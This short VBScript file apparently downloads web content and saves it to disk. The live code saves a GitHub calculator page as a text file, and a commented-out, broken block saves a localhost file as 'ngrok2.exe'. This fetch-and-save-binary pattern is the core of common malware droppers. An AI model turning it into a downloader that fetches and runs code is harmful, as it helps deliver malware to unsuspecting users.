' src = "http://127.0.0.1:8010/Users/FREE%20SERVICESPLUS/Desktop/batch/ngrok.txt"
' Set v1 = CreateObject ("MSXML2.XMLHTTP")
' Set v2  = CreateObject ("ADODB.Stream")
' v1.open "GET", src, true
' v1.send ()
' v2.open
' v2.Type = 1
' v2.Write v1.ResponseBody
' v2.SaveToFile "http://127.0.0.1:8010/Users/FREE%20SERVICESPLUS/Desktop/batch/ngrok2.exe"
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "https://github.com/Shabby237/Calculatrice/blob/main/Calculatrice/dist/index.html", False
xHttp.Send

with bStrm
    .type = 1 '//binary
    .open
    .write xHttp.responseBody
    .savetofile "C:\Users\FREE SERVICESPLUS\Desktop\batch\ngrock2.txt", 2 '//overwrite
end with